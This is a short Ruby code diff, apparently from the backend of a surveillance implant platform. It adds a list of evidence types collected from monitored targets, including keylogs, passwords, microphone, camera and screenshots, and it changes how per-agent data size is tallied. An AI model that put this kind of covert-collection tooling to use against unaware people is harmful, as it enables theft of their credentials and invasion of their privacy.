@@ -6,6 +6,9 @@ require_relative '../shard'
 
 class Evidence
 
+  TYPES = ["addressbook", "application", "calendar", "call", "camera", "chat", "clipboard", "device",
+           "file", "keylog", "position", "message", "mic", "mouse", "password", "print", "screenshot", "url"]
+
   def self.collection_name(target)
     "evidence.#{target}"
   end
@@ -53,7 +56,7 @@ class Evidence
           agent.stat.dashboard ||= {}
           agent.stat.dashboard[self.type] ||= 0
           agent.stat.dashboard[self.type] += 1
-          agent.stat.size += Mongoid.database.collection("#{Evidence.collection_name(target)}").stats()['avgObjSize'].to_i
+          agent.stat.size += self.data.to_s.length
           agent.stat.grid_size += self.data[:_grid_size] unless self.data[:_grid].nil?
           agent.save
           # update the target of this agent
